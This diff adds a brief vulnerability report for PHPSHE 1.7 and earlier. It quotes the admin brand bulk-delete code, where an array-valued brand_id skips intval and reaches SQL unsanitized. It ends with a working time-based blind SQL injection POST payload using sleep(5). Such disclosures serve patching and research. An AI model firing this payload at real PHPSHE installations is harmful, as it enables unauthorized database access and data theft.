@@ -1,0 +1,31 @@
+# By pull
+
+SQL Injection：
+    Normally delete the content, $_p_brand_id will enter the intval function，but delete the content in bulk，$_p_brand_id will directly enter the SQL statement
+
+'''
+
+
+Source:
+		  /module/admin/brand.php:68-77
+
+	case 'del':
+		pe_token_match();
+		$brand_id = is_array($_p_brand_id) ? $_p_brand_id : intval($_g_id);
+		if ($db->pe_delete('brand', array('brand_id'=>$brand_id))) {
+			pe_success('删除成功!');
+		}
+		else {
+			pe_error('删除失败...');
+		}
+	break;
+
+	Affected software:PHPSHE <=1.7
+	Software Link: http://www.phpshe.com/down/phpshe1.7.rar
+
+'''
+
+exploit:
+http://localhost:8081/admin.php?mod=brand
+POST 
+checkall=on&brand_id%5B%5D=2') and if(1,sleep(5),1)#
